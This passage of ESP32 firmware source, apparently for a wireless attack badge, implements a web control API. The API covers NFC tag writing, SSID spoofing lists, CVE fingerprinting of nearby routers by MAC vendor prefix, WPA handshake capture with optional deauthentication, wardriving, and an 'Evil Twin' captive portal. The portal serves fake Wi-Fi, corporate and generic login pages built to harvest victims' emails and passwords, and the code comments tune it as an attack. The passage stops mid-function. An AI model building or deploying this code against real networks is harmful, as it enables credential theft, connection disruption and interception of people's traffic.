            char c = (char)ndef[7 + lang_len + i];
            if (c == 0xFE || c == 0) break;
            content += c;
          }
        }
      }
      if (content.length() == 0 && ndef[0] != 0x00) {
        ctype = "raw";
        for (int i = 0; i < 16; i++) {
          char hx[4]; snprintf(hx, 4, "%02X ", ndef[i]);
          content += hx;
        }
      }
    }

    server.send(200, "application/json; charset=utf-8",
      "{\"uid\":\"" + uid + "\",\"type\":\"" + ctype +
      "\",\"content\":\"" + mgmtJsonEscape(content) + "\"}");
#else
    server.send(200, "application/json; charset=utf-8", "{\"uid\":\"--\",\"type\":\"unsupported\",\"content\":\"\"}");
#endif
  });

  // ── API: POST /api/nfc {action, data, hex, block} ────────────
  server.on("/api/nfc", HTTP_POST, [this]() {
    String action = server.hasArg("action") ? server.arg("action") : "";
    String data   = server.hasArg("data")   ? server.arg("data")   : "";
    if (action == "" || data == "") {
      if (action == "") action = mgmtBodyStr("action");
      if (data == "")   data   = mgmtBodyStr("data");
    }
    String cmd;
    if (action == "read") {
      cmd = "nfc read";
    } else if (action == "write-url" || action == "write-text") {
      if (data.length() == 0 || data.length() > 120) {
        server.send(400, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"invalid_data\",\"output\":\"data must be 1..120 chars\"}");
        return;
      }
      if (!mgmtInputClean(data)) {
        mgmtSendErr("blocked_metachar", "data contains forbidden character");
        return;
      }
      // NOTE: the CLI parser splits on spaces, so write-text keeps only
      // the first word; multi-word text is a known CLI limitation.
      cmd = (action == "write-url" ? "nfc -u " : "nfc -t ") + data;
    } else if (action == "write-raw") {
      // Write raw hex bytes to a specific block (1-56)
      // hex: space-separated hex bytes, e.g. "03 1A D1 01 ..."
      // block: starting block number (default 1)
      String hex = server.hasArg("hex") ? server.arg("hex") : mgmtBodyStr("hex");
      int blk = (int)mgmtBodyLong("block", 1);
      if (hex.length() == 0) {
        server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"hex required\"}");
        return;
      }
      if (blk < 1 || blk > 56) {
        server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"block must be 1-56\"}");
        return;
      }
#ifdef HAS_NFC
      nfc_obj.begin();
      // Parse hex string into bytes
      uint8_t bytes[256]; int nbytes = 0;
      for (int i = 0; i < (int)hex.length() && nbytes < 256; ) {
        while (i < (int)hex.length() && (hex[i] == ' ' || hex[i] == ':')) i++;
        if (i + 1 < (int)hex.length()) {
          char hb[3] = {hex[i], hex[i+1], 0};
          bytes[nbytes++] = (uint8_t)strtol(hb, NULL, 16);
          i += 2;
        } else break;
      }
      // Write 16 bytes per block
      int blocks = (nbytes + 15) / 16;
      int written = 0;
      for (int b = 0; b < blocks; b++) {
        uint8_t buf[16];
        memset(buf, 0, 16);
        for (int j = 0; j < 16 && (b*16+j) < nbytes; j++)
          buf[j] = bytes[b*16+j];
        if (nfc_obj.write_i2c_block(blk + b, buf)) written++;
        else break;
      }
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":true,\"blocks_written\":" + String(written) +
        ",\"bytes\":" + String(nbytes) + "}");
#else
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"NFC not available\"}");
#endif
      return;
    } else {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_action\",\"output\":\"action must be read/write-url/write-text/write-raw\"}");
      return;
    }
    Serial.println("[MGMT] web nfc: " + action);
    SerialMirror::logDrain();
    cli_obj.runCommand(cmd);
    delay(150);
    String out = SerialMirror::logDrain();
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"output\":\"" + mgmtJsonEscape(out) + "\"}");
  });

  // ── API: GET/POST /api/settings ──────────────────────────────
  server.on("/api/settings", HTTP_GET, [this]() {
    server.send(200, "application/json; charset=utf-8", settings_obj.getSettingsString());
  });
  server.on("/api/settings", HTTP_POST, [this]() {
    // E: Bug E — now mgmtBodyStr() tries form args first, then ArduinoJson body
    String key = mgmtBodyStr("key");
    String on  = mgmtBodyStr("on");
    if (key.length() == 0 || key.length() > 32) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"invalid_key\",\"output\":\"missing or too-long key\"}");
      return;
    }
    for (size_t i = 0; i < key.length(); i++) {
      char c = key[i];
      if (!isAlphaNumeric(c) && c != '_') {
        server.send(400, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"invalid_key\",\"output\":\"key must be alphanumeric/underscore\"}");
        return;
      }
    }
    bool val = (on == "1" || on == "true" || on == "enable");
    bool result = settings_obj.saveSetting<bool>(key, val);
    if (!result) {
      server.send(400, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"unknown_setting\",\"output\":\"setting not found\"}");
      return;
    }
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"key\":\"" + mgmtJsonEscape(key) + "\"" +
      ",\"value\":" + String(val ? "true" : "false") + "}");
  });

  // OPTIONS preflight: same-origin only, plain 204 (no wildcard)
  server.on("/api/cmd", HTTP_OPTIONS, [this]() {
    server.send(204, "text/plain", "");
  });

  // ── API: GET /api/ssids — list current SSID list ──────────────
  server.on("/api/ssids", HTTP_GET, [this]() {
    String json = "{\"count\":" + String(ssids->size()) + ",\"ssids\":[";
    for (int i = 0; i < ssids->size(); i++) {
      if (i) json += ",";
      json += "{\"i\":" + String(i) + ",\"name\":\"" + mgmtJsonEscape(ssids->get(i).essid) + "\"}";
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: POST /api/ssids {action:add|remove|clear|generate, name, index, count}
  server.on("/api/ssids", HTTP_POST, [this]() {
    String action = server.hasArg("action") ? server.arg("action") : mgmtBodyStr("action");
    if (action == "add") {
      String name = server.hasArg("name") ? server.arg("name") : mgmtBodyStr("name");
      if (name.length() == 0 || name.length() > 32) {
        server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"name required (1-32 chars)\"}");
        return;
      }
      wifi_scan_obj.addSSID(name);
      mgmtSaveSSIDs(ssids);
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"count\":" + String(ssids->size()) + "}");
    } else if (action == "remove") {
      int idx = (int)mgmtBodyLong("index", -1);
      if (idx < 0 || idx >= ssids->size()) {
        server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"invalid index\"}");
        return;
      }
      ssids->remove(idx);
      mgmtSaveSSIDs(ssids);
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"count\":" + String(ssids->size()) + "}");
    } else if (action == "clear") {
      while (ssids->size() > 0) ssids->remove(0);
      if (SPIFFS.exists("/ssids.txt")) SPIFFS.remove("/ssids.txt");
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"count\":0}");
    } else if (action == "generate") {
      int count = (int)mgmtBodyLong("count", 10);
      if (count < 1) count = 1;
      if (count > 50) count = 50;
      wifi_scan_obj.generateSSIDs(count);
      mgmtSaveSSIDs(ssids);
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"count\":" + String(ssids->size()) + "}");
    } else if (action == "import") {
      // Bulk import: newline-separated SSIDs in "list" field
      String list = server.hasArg("list") ? server.arg("list") : mgmtBodyStr("list");
      int added = 0;
      int start = 0;
      for (int i = 0; i <= (int)list.length(); i++) {
        if (i == (int)list.length() || list[i] == '\n' || list[i] == '|') {
          String name = list.substring(start, i);
          name.trim();
          if (name.length() > 0 && name.length() <= 32) {
            wifi_scan_obj.addSSID(name);
            added++;
          }
          start = i + 1;
        }
      }
      mgmtSaveSSIDs(ssids);
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":true,\"added\":" + String(added) + ",\"count\":" + String(ssids->size()) + "}");
    } else {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"action must be add/remove/clear/generate/import\"}");
    }
  });

  // ── API: GET /api/cvecheck — check scanned APs for known vulnerable fingerprints
  // Checks BSSID OUI + SSID patterns against known vulnerable router families
  server.on("/api/cvecheck", HTTP_GET, [this]() {
    String json = "{\"results\":[";
    int found = 0;
    for (int i = 0; i < access_points->size(); i++) {
      AccessPoint ap = access_points->get(i);
      char bssid[18];
      snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
               ap.bssid[0], ap.bssid[1], ap.bssid[2],
               ap.bssid[3], ap.bssid[4], ap.bssid[5]);
      String oui = String(bssid).substring(0, 8);
      oui.toUpperCase();
      String ssid_lower = ap.essid;
      ssid_lower.toLowerCase();

      // CVE-2025-13942: Zyxel routers with UPnP RCE (ISP-deployed)
      // OUIs: Zyxel 00:A0:C5, 28:28:5D, 38:43:7D, 40:B0:76, 50:67:F0, 6C:C4:17
      // 78:D2:94, 84:E8:92, 90:EF:68, A4:21:8A, B0:4E:26, BC:CF:4F, C8:6C:87
      // D4:21:22, E4:F4:C6, EC:1D:7F, F4:92:BF
      bool zyxel = (oui == "00:A0:C5" || oui == "28:28:5D" || oui == "38:43:7D" ||
                    oui == "40:B0:76" || oui == "50:67:F0" || oui == "6C:C4:17" ||
                    oui == "78:D2:94" || oui == "84:E8:92" || oui == "90:EF:68" ||
                    oui == "A4:21:8A" || oui == "B0:4E:26" || oui == "BC:CF:4F" ||
                    oui == "C8:6C:87" || oui == "D4:21:22" || oui == "E4:F4:C6" ||
                    oui == "EC:1D:7F" || oui == "F4:92:BF");

      // CVE-2024-53375: TP-Link Archer RCE via Avira (multiple models)
      // OUIs: TP-Link 00:27:19, 14:EB:B6, 30:DE:4B, 50:D4:F7, 54:AF:97
      // 60:32:B1, 64:6E:97, 6C:5A:B0, 70:4F:57, 78:8C:B5, 7C:8B:CA
      // 90:F6:52, 98:25:4A, A4:2B:B0, AC:84:C6, B0:A7:B9, C0:06:C3
      // C4:E9:84, CC:32:E5, D4:6E:0E, D8:47:32, E8:48:B8, F4:F2:6D
      bool tplink = (oui == "00:27:19" || oui == "14:EB:B6" || oui == "30:DE:4B" ||
                     oui == "50:D4:F7" || oui == "54:AF:97" || oui == "60:32:B1" ||
                     oui == "64:6E:97" || oui == "6C:5A:B0" || oui == "70:4F:57" ||
                     oui == "78:8C:B5" || oui == "7C:8B:CA" || oui == "90:F6:52" ||
                     oui == "98:25:4A" || oui == "A4:2B:B0" || oui == "AC:84:C6" ||
                     oui == "B0:A7:B9" || oui == "C0:06:C3" || oui == "C4:E9:84" ||
                     oui == "CC:32:E5" || oui == "D4:6E:0E" || oui == "D8:47:32" ||
                     oui == "E8:48:B8" || oui == "F4:F2:6D");

      // CVE-2026-20452: MediaTek WPS kernel heap overflow (MT7xxx chipsets)
      // Affects devices using MT7615/7915/7916/7981/7986/7990/7992/7993
      // Common in IZZI/Telmex CPE routers in Mexico (Arris/Arcadyan/Sercomm)
      // OUIs: Arris/CommScope 00:1D:D1, 00:1E:5A, 00:19:47, 10:86:8C, 14:AB:F0
      // 20:3D:66, 44:E1:37, 60:02:92, 64:AE:0C, 84:BB:69, 8C:7A:15
      // Arcadyan 64:D1:54, 88:C3:97, B0:4E:26, E0:B9:E5
      // IZZI-specific: starts with IZZI- or INFINITUM
      bool mediatek_cpe = false;
      if (ssid_lower.startsWith("izzi") || ssid_lower.startsWith("infinitum") ||
          ssid_lower.startsWith("totalplay") || ssid_lower.startsWith("megacable")) {
        // Mexican ISP CPE — very likely MediaTek MT7xxx
        mediatek_cpe = true;
      }
      bool arris = (oui == "00:1D:D1" || oui == "00:1E:5A" || oui == "00:19:47" ||
                    oui == "10:86:8C" || oui == "14:AB:F0" || oui == "20:3D:66" ||
                    oui == "44:E1:37" || oui == "60:02:92" || oui == "64:AE:0C" ||
                    oui == "84:BB:69" || oui == "8C:7A:15" || oui == "64:D1:54" ||
                    oui == "88:C3:97" || oui == "E0:B9:E5");

      // CVE-2024-41992: Arcadyan 5G routers wfa_dut RCE
      bool arcadyan = (oui == "64:D1:54" || oui == "88:C3:97" || oui == "B0:4E:26" || oui == "E0:B9:E5");

      String cves = "";
      if (zyxel) cves += "CVE-2025-13942 (Zyxel UPnP RCE),";
      if (tplink) cves += "CVE-2024-53375 (TP-Link Archer Avira RCE),";
      if (mediatek_cpe || arris) cves += "CVE-2026-20452 (MediaTek WPS kernel heap overflow),";
      if (arcadyan) cves += "CVE-2024-41992 (Arcadyan wfa_dut RCE),";

      if (cves.length() > 0) {
        cves = cves.substring(0, cves.length() - 1); // remove trailing comma
        if (found) json += ",";
        json += "{\"i\":" + String(i) + ",\"ssid\":\"" + mgmtJsonEscape(ap.essid) +
                "\",\"bssid\":\"" + String(bssid) +
                "\",\"ch\":" + String(ap.channel) +
                ",\"cves\":\"" + mgmtJsonEscape(cves) + "\"}";
        found++;
      }
    }
    json += "],\"total\":" + String(found) + "}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: POST /api/handshake — passive capture (AP stays up) ──
  // {deauth:bool, duration:10-300}
  server.on("/api/handshake", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"busy\"}");
      return;
    }

    bool do_deauth = mgmtBodyBool("deauth", false);
    long dur = mgmtBodyLong("duration", 60);
    if (dur < 10) dur = 10;
    if (dur > 300) dur = 300;

    // Reset capture list
    hs_count = 0;
    hs_active = true;
    hs_deauth = do_deauth;
    memset(hs_list, 0, sizeof(hs_list));

    // Enable promiscuous mode while keeping AP running (AP_STA)
    WiFi.mode(WIFI_AP_STA);
    delay(100);

    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&EvilPortal::hsSnifferCallback);
    esp_wifi_set_promiscuous(true);

    Serial.println("[MGMT] Passive handshake capture started, deauth=" +
                   String(do_deauth) + " dur=" + String(dur) + "s");

    this->mgmt_job_state = MGMT_JOB_ATTACK;
    this->mgmt_job_kind  = "handshake-passive";
    this->mgmt_job_t0    = millis();
    this->mgmt_job_duration_s = (uint32_t)dur;

    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"mode\":\"passive\",\"channels\":13,\"deauth\":" + String(do_deauth ? "true" : "false") +
      ",\"duration\":" + String(dur) + "}");
  });

  // ── API: GET /api/handshake — read captured handshakes ────────
  server.on("/api/handshake", HTTP_GET, [this]() {
    String json = "{\"active\":" + String(hs_active ? "true" : "false") +
                  ",\"count\":" + String(hs_count) + ",\"entries\":[";
    for (int i = 0; i < hs_count; i++) {
      if (i > 0) json += ",";
      char mac[18];
      snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
               hs_list[i].bssid[0], hs_list[i].bssid[1], hs_list[i].bssid[2],
               hs_list[i].bssid[3], hs_list[i].bssid[4], hs_list[i].bssid[5]);

      uint8_t m = hs_list[i].eapol_msgs;
      String hs_type = "none";
      if (m == 0x0F) hs_type = "full";        // all 4 msgs
      else if ((m & 0x03) == 0x03) hs_type = "half"; // M1+M2
      else if (hs_list[i].has_pmkid) hs_type = "pmkid";
      else if (m > 0) hs_type = "partial";

      json += "{\"bssid\":\"" + String(mac) + "\"";
      json += ",\"ssid\":\"" + mgmtJsonEscape(String(hs_list[i].ssid)) + "\"";
      json += ",\"ch\":" + String(hs_list[i].ch);
      json += ",\"rssi\":" + String(hs_list[i].rssi);
      json += ",\"msgs\":" + String(m);
      json += ",\"pmkid\":" + String(hs_list[i].has_pmkid ? "true" : "false");
      json += ",\"type\":\"" + hs_type + "\"}";
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: POST /api/wardrive {type:wifi|bt} — start wardrive mode
  server.on("/api/wardrive", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"busy\"}");
      return;
    }
    String type = mgmtBodyStr("type");
    if (type == "") type = "wifi";
    String cmd = (type == "bt") ? "btwardrive" : "wardrive";
    // F-10 fix: both wardrive commands are gated behind getGpsModuleStatus() inside
    // CommandLine, and runCommand() returns void. Without this pre-check the handler
    // reported {"ok":true} and set MGMT_JOB_SCANNING while no scan ever started, so the
    // UI showed "activo", got active:false from /api/wardrive/data and killed its poller.
#ifdef HAS_GPS
    if (!gps_obj.getGpsModuleStatus()) {
      server.send(503, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"gps_down\",\"output\":\"GPS no detectado. Abre la pestana GPS, "
        "pulsa Reiniciar GPS y espera el fix antes de iniciar el wardrive.\"}");
      return;
    }
#else
    server.send(503, "application/json; charset=utf-8",
      "{\"ok\":false,\"code\":\"no_gps_support\",\"output\":\"Esta compilacion no incluye GPS.\"}");
    return;
#endif
    // A: Bug A — guard BLE for bt wardrive
    if (type == "bt" && !wifi_scan_obj.ensureBLE()) {
      size_t freeLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
      server.send(503, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"ble_no_memory\",\"output\":\"Not enough free RAM to start Bluetooth (" +
        String(freeLargest / 1024) + " KB free)\"}");
      return;
    }
    Serial.println("[MGMT] web wardrive: " + cmd);
    SerialMirror::logDrain();
    cli_obj.runCommand(cmd);
    // F-10 fix: runCommand() is void, so confirm the scan really started before
    // reporting success. CommandLine sets this flag only on its success path.
    {
      extern WardriverStore wardrive_store;
      if (!wardrive_store.active) {
        server.send(503, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"wardrive_refused\",\"output\":\"El firmware no pudo iniciar el "
          "wardrive. Revisa el estado del GPS y vuelve a intentar.\"}");
        return;
      }
    }
    this->mgmt_job_state = MGMT_JOB_SCANNING;
    this->mgmt_job_kind  = "wardrive-" + type;
    this->mgmt_job_t0    = millis();
    long dur = mgmtBodyLong("duration", 0);
    this->mgmt_job_duration_s = (uint32_t)dur; // 0 = indefinite
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  });

  // ── API: GET /api/wardrive/data — return wardrive captures as JSON (chunked)
  server.on("/api/wardrive/data", HTTP_GET, [this]() {
    extern WardriverStore wardrive_store;
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "application/json; charset=utf-8", "");
    server.sendContent("{\"active\":" + String(wardrive_store.active ? "true" : "false") +
                       ",\"count\":" + String(wardrive_store.total) + ",\"entries\":[");
    bool first = true;
    for (int i = 0; i < wardrive_store.total; i++) {
      WardriverEntry *e = wardrive_store.get(i);
      if (!e || !e->used) continue;
      String buf = "";
      if (!first) buf += ",";
      first = false;
      String safe_ssid = String(e->ssid);
      safe_ssid.replace("\"", "\\\"");
      buf += "{\"b\":\"" + String(e->bssid) + "\"";
      buf += ",\"s\":\"" + safe_ssid + "\"";
      buf += ",\"a\":\"" + String(e->auth) + "\"";
      buf += ",\"ch\":" + String(e->channel);
      buf += ",\"r\":" + String(e->rssi);
      buf += ",\"la\":" + String(e->lat, 7);
      buf += ",\"lo\":" + String(e->lon, 7);
      buf += ",\"al\":" + String(e->alt, 1);
      buf += ",\"ac\":" + String(e->accuracy, 1);
      buf += ",\"t\":\"" + String(e->datetime) + "\"}";
      server.sendContent(buf);
    }
    server.sendContent("]}");
    server.sendContent("");
  });

  // ── API: GET /api/wardrive/csv — export wardrive captures as CSV (chunked)
  server.on("/api/wardrive/csv", HTTP_GET, [this]() {
    extern WardriverStore wardrive_store;
    // I: Bug I — RFC4180 quoting helper (double-quotes inside fields doubled)
    auto rfc4180 = [](const char* s) -> String {
      String out = "\"";
      for (const char* p = s; *p; p++) {
        if (*p == '"') out += "\"\"";
        else out += *p;
      }
      out += "\"";
      return out;
    };
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "text/csv", "");
    server.sendContent("WigleWifi-1.4,appRelease=v1.2.1,model=PWNTERREY-C5,release=1.0,device=ESP32-C5,display=NONE,board=C5,brand=Pwnterrey\n");
    server.sendContent("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
    for (int i = 0; i < wardrive_store.total; i++) {
      WardriverEntry *e = wardrive_store.get(i);
      if (!e || !e->used) continue;
      String line = String(e->bssid) + "," +
                    rfc4180(e->ssid) + "," +
                    rfc4180(e->auth) + "," +
                    rfc4180(e->datetime) + "," +
                    String(e->channel) + "," +
                    String(e->rssi) + "," +
                    String(e->lat, 7) + "," +
                    String(e->lon, 7) + "," +
                    String(e->alt, 1) + "," +
                    String(e->accuracy, 1) + ",WIFI\n";
      server.sendContent(line);
    }
    server.sendContent("");
  });

  // ── API: POST /api/wardrive/clear — clear wardrive store
  server.on("/api/wardrive/clear", HTTP_POST, [this]() {
    extern WardriverStore wardrive_store;
    wardrive_store.clear();
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  });

  // ── API: POST /api/blescan — scan for BLE devices
  server.on("/api/blescan", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"busy\"}");
      return;
    }
    // Free AP scan results to reclaim heap before BLE init
    // F-11 fix: LinkedList::clear() drops the nodes but never deletes each AP's
    // stations/beacon LinkedLists, leaking ~5KB per 30-AP scan in the very path whose
    // purpose is to free heap. clearAPs() is the proven correct teardown.
    if (access_points && access_points->size() > 0) {
      wifi_scan_obj.clearAPs();
      Serial.printf("[MGMT] Freed AP scan results for BLE (%u B largest now)\n",
        (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    }
    // A: Bug A — ensure BLE host is up with heap check
    if (!wifi_scan_obj.ensureBLE()) {
      size_t freeLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
      server.send(503, "application/json; charset=utf-8",
        "{\"ok\":false,\"code\":\"ble_no_memory\",\"output\":\"Not enough free RAM to start Bluetooth (" +
        String(freeLargest / 1024) + " KB free)\"}");
      return;
    }
    Serial.println("[MGMT] web BLE scan");
    SerialMirror::logDrain();
    cli_obj.runCommand("sniffbt");
    this->mgmt_job_state = MGMT_JOB_SCANNING;
    this->mgmt_job_kind  = "ble-scan";
    this->mgmt_job_t0    = millis();
    long dur = mgmtBodyLong("duration", 15);
    if (dur < 5) dur = 5;
    if (dur > 120) dur = 120;
    this->mgmt_job_duration_s = (uint32_t)dur;
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  });

  // ── API: POST /api/sniffer {type:beacon|probe|deauth|raw|esp}
  server.on("/api/sniffer", HTTP_POST, [this]() {
    if (this->mgmt_job_state != MGMT_JOB_IDLE) {
      server.send(409, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"busy\"}");
      return;
    }
    String type = mgmtBodyStr("type");
    String cmd;
    if (type == "beacon") cmd = "sniffbeacon";
    else if (type == "probe") cmd = "sniffprobe";
    else if (type == "deauth") cmd = "sniffdeauth";
    else if (type == "raw") cmd = "sniffraw";
    else if (type == "esp") cmd = "sniffesp";
    else if (type == "pwn") cmd = "sniffpwn";
    else {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"type: beacon/probe/deauth/raw/esp/pwn\"}");
      return;
    }
    Serial.println("[MGMT] web sniffer: " + cmd);
    SerialMirror::logDrain();
    cli_obj.runCommand(cmd);
    this->mgmt_job_state = MGMT_JOB_SCANNING;
    this->mgmt_job_kind  = "sniff-" + type;
    this->mgmt_job_t0    = millis();
    long dur = mgmtBodyLong("duration", 0);
    this->mgmt_job_duration_s = (uint32_t)dur;
    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
  });

  // ── API: GET /api/captures — read saved captures from SPIFFS ──
  server.on("/api/captures", HTTP_GET, [this]() {
    if (!SPIFFS.exists("/captures.json")) {
      server.send(200, "application/json; charset=utf-8", "{\"captures\":[]}");
      return;
    }
    File f = SPIFFS.open("/captures.json", "r");
    String data = f.readString();
    f.close();
    server.send(200, "application/json; charset=utf-8", data);
  });

  // ── API: DELETE /api/captures — clear captured data ──────────
  server.on("/api/captures", HTTP_POST, [this]() {
    String action = mgmtBodyStr("action");
    if (action == "clear") {
      if (SPIFFS.exists("/captures.json")) SPIFFS.remove("/captures.json");
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
    } else {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false}");
    }
  });

  // ── API: POST /api/eviltwin — start Evil Twin portal ─────────
  // Saves current captures, tears down management AP, starts captive portal
  // Body: {ssid, channel, template:'generic'|'wifi'|'corp'|'custom', duration:s}
  server.on("/api/eviltwin", HTTP_POST, [this]() {
    String ssid_et = mgmtBodyStr("ssid");
    int ch_req = (int)mgmtBodyLong("channel", 1);
    int ch = ch_req;
    // Clamp the clone to 2.4 GHz. The panel prefills this field from whichever
    // AP was last selected in the scan list and does NOT clear it when the SSID
    // is typed over by hand, so a stale 5 GHz channel used to ride along and the
    // evil AP came up on, say, channel 149 - a band the operator's phone was not
    // even scanning. softAP() succeeded, the panel truthfully reported READY,
    // and the network was simply invisible where anyone was looking for it.
    // Cloning onto 2.4 GHz is also the better attack: the SSID is what the
    // victim matches on, 2.4 GHz carries further, and this board's 5 GHz AP
    // support is region-gated and unverified here.
    if (ch < 1 || ch > 13) ch = 1;
    String tpl = mgmtBodyStr("template");
    if (tpl == "") tpl = "generic";
    // G: Bug G — duration support: 0=until reset, default 300s
    long dur = mgmtBodyLong("duration", 300);
    if (dur < 0) dur = 300;

    if (ssid_et.length() == 0 || ssid_et.length() > 32) {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"ssid required (1-32)\"}");
      return;
    }

    // Save response before we tear down management
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"ssid\":\"" + mgmtJsonEscape(ssid_et) +
      "\",\"duration\":" + String(dur) +
      ",\"note\":\"Management AP will shut down. It will return after duration expires.\"}");
    delay(500); // let response reach the phone

    // Write the evil template to /evil.html
    String html = "";
    if (tpl == "custom" && SPIFFS.exists("/evil_custom.html")) {
      // Use user-uploaded custom page
      File f = SPIFFS.open("/evil_custom.html", "r");
      html = f.readString();
      f.close();
    } else if (tpl == "wifi") {
      html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}form{background:#fff;padding:32px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.1);width:90%;max-width:360px}h2{margin-bottom:16px;font-size:20px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}button{width:100%;padding:14px;margin-top:12px;background:#007aff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600}</style></head><body><form action='/get' method='GET'><h2>WiFi Login Required</h2><p style='margin-bottom:16px;color:#666;font-size:14px'>Enter your credentials to access the network</p><input name='email' placeholder='Username or Email' required><input name='password' type='password' placeholder='Password' required><button>Connect</button></form></body></html>";
    } else if (tpl == "corp") {
      html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}form{background:#16213e;padding:32px;border-radius:12px;width:90%;max-width:360px;box-shadow:0 8px 24px rgba(0,0,0,.3)}h2{margin-bottom:8px}p{color:#a0a0b0;font-size:13px;margin-bottom:20px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #2a2a4a;border-radius:8px;font-size:16px;background:#0f3460;color:#fff}button{width:100%;padding:14px;margin-top:12px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600}</style></head><body><form action='/get' method='GET'><h2>Corporate Network</h2><p>Authentication required for network access</p><input name='email' placeholder='Employee ID' required><input name='password' type='password' placeholder='Password' required><button>Sign In</button></form></body></html>";
    } else {
      // generic
      html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh}form{background:#fff;padding:32px;border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,.08);width:90%;max-width:360px;text-align:center}h2{margin-bottom:8px;font-size:22px}p{color:#888;font-size:14px;margin-bottom:20px}input{width:100%;padding:14px;margin:6px 0;border:1px solid #e0e0e0;border-radius:10px;font-size:16px}button{width:100%;padding:14px;margin-top:14px;background:#007aff;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600}</style></head><body><form action='/get' method='GET'><h2>Sign In</h2><p>Authentication required</p><input name='email' placeholder='Email' required><input name='password' type='password' placeholder='Password' required><button>Continue</button></form></body></html>";
    }

    // Backup management portal before overwriting with evil template
    if (SPIFFS.exists("/portal.html") && !SPIFFS.exists("/portal_mgmt.html")) {
      File src = SPIFFS.open("/portal.html", "r");
      File dst = SPIFFS.open("/portal_mgmt.html", "w");
      while (src.available()) dst.write(src.read());
      dst.close();
      src.close();
      Serial.println("[MGMT] Management portal backed up");
    }

    // The gzip twin must be moved aside as well, or the attack serves the wrong
    // page. mgmtServeFile() prefers "<path>.gz" whenever the client sends
    // Accept-Encoding: gzip, which every browser and phone does. Overwriting
    // only the plain /portal.html therefore left the captive handler serving
    // /portal.html.gz - the real management panel - to the victim, handing them
    // this badge's control UI instead of the credential form. Renaming it (not
    // deleting it) keeps the panel recoverable, and the restore below is
    // symmetric. The rename is also self-healing: if the badge resets mid-attack
    // the restore runs from setupManagementServer() on the next boot.
    if (SPIFFS.exists("/portal.html.gz") && !SPIFFS.exists("/portal_mgmt.html.gz")) {
